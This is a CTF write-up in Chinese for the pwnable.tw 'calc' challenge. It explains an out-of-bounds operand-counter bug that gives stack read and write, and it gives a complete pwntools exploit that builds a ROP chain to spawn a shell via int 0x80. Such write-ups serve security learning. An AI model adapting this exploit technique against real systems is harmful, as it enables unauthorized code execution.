# pwnable.tw-calc

#### 题目分析

题目是静态链接，只开了NX没有办法shellcode，题目的功能是大致就相当于一个计算器，很容易就逆清楚了。

#### 漏洞分析

主要漏洞在于，程序没有对类似于"+3"，这样的不完整的表达式进行检查。而程序在进行操作数寻址的时候是根据操作数缓冲区头部的计数器完成的（如下代码），而对于类似于"+3"这种残缺的表达式可以修改头部的计数值，造成在访问操作数时的越界。

```c
 if ( op_number > 0 ),
      {
        current_num_idx = (*op_number_buffer)++;// 计数
        op_number_buffer[current_num_idx + 1] = op_number;// 保存操作数
      }
```

#### 漏洞利用

###### 任意读

首先这种以操作符直接开头的表达式可以修改操作数计数器，如果只是简单的一个类似于"+360"这样的表达式，可以将计数器的值修改为360从而在打印结果的时候越界打印出栈中一些重要的数据。比如说栈中的地址。

```c
if ( parse_expr(expr, op_number_buffer) )
    {
      printf("%d\n", op_number_buffer[op_number_buffer[0]]);
      fflush(stdout);
    }//打印结果是用计数器寻址
```

###### 任意写

而如果过是类似于"+360+1"，这种比较复杂的残缺表达式，在第一次加法将计数器修改到"360"之后第二次加法就可以对"360"号单元的内容进行修改，也就是任意写。这样就可以通过idx的修改，来在栈中进行ROP。

###### 利用

因为式静态链接，所以程序有很多可用的gadget，虽然没有system函数，但是可以通过系统调用的方式直接拿到shell。需要eax = 11,ebx = bin_sh_addr,ecx = edx = 0,然后int 0x80就可以拿到shell。因为没有/bin/sh的字符串，所以需要自己在栈中写入然后拿到栈地址。

下面是栈帧的布局。

```
idx		content
361		pop_eax_ret
362		11
363		pop_edx_ecx_ebx_ret
364		0
365		0
366		bin_sh_addr
367		/bin
368		/sh/x00
```

第一次通过+360打印ebp中保存的栈基址。就可以计算出/bin/sh的偏移。

每一次写入rop都需要先将栈中原有的数据打印出来然后，将这个单元减去这个数据，就可以将这一个单元清零。然后再加上需要写入的数据就可以写入rop链。所以每次写入rop都要进行三次交互。

整个rop写入完毕之后，输入一个不是算式的字符串就可以让程序返回，拿到shell。

### EXP:

```python
#coding=utf-8
from pwn import *
#context.log_level = 'debug'
local = 1
exec_file="./calc"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file,checksec = True)
argv=[]
if local :
    a=process(exec_file)
    if context.arch == "i386" :
        libc=ELF("/lib/i386-linux-gnu/libc.so.6",checksec = False)
    elif context.arch == "amd64" :
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec = False) 
else:
    a=remote("node3.buuoj.cn",26826)
    libc=ELF("./libc.so.6")
def get_base(a):
    print a.libs()
    print a.argv[0]
    text_base = a.libs()[a._cwd+a.argv[0].strip('.')]
    for key in a.libs():
        if "libc.so.6" in key:
            return text_base,a.libs()[key]
def debug():
    #text_base,libc_base=get_base(a)
    #script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script='''
    b *0x08049411
    '''
    gdb.attach(a,script)
def fuck(address):
    n = globals()
    for key,value in n.items():
        if value == address:
            return success(key+"  ==>  "+hex(address))
def menu(idx):
    a.sendlineafter("",str(idx))
def add(size):
    return 

def delete(idx):
    return
    
def edit(idx,content):
    return 
    
def show(idx):
    return 
relloc_offset = [0,2,4,6,0xb,0xc,0x10]
#payload='\x00'*0x33+p64(0x00000000fbad1800)+p64(0)*3+'\x00'    #stdout-0x33

def transform(current):
    if current < 0:
        current += 0x100000000
    fuck(current)
    return(current)

payload =  "+9*9" * 4 + "+3*5" + "+3*6"
a.sendlineafter("=== Welcome to SECPROG calculator ===\n",payload)
canary = int(a.recvline(keepends=False),10)
canary = transform(canary)


payload = "+360"
a.sendline(payload)
stack_addr = int(a.recvline(keepends=False),10)
stack_addr = transform(stack_addr)

pop_eax_ret = 0x0805c34b
int_0x80 = 0x08049a21
pop_edx_ecx_ebx_ret = 0x080701d0

#debug()
ROP_chain = p32(pop_eax_ret) + p32(11) + p32(pop_edx_ecx_ebx_ret) + p32(0) + p32(0) + p32(stack_addr) + p32(int_0x80) + "/bin" + "/sh\x00"
print len(ROP_chain)/4
for i in range(len(ROP_chain)/4):
    payload = "+36" + str(i+1)
    a.sendline(payload)
    bins = int(a.recvline(keepends=False),10)
    if bins < 0:
        bins = -bins
        payload = "+36" + str(i+1) + '+' + str(bins)
        a.sendline(payload)
        a.recvline(keepends=False)
    elif bins == 0:
        print("its zero.")
    else:
        payload = "+36" + str(i+1) + '-' +str(bins)
        a.sendline(payload)
        a.recvline(keepends=False)
    gadget = u32(ROP_chain[i*4:(i+1)*4])
    if  gadget > 0x7fffffff: 
        payload = "+36" + str(i+1) + "-1" + "-" + str(0xffffffff - gadget)
        a.sendline(payload)
        a.recvline(keepends=False)
    elif gadget == 0:
        continue
    else :
        payload = "+36" + str(i+1) + '+' +str(gadget)
        a.sendline(payload)
        a.recvline(keepends=False)
a.sendline("shell")
a.interactive()

```

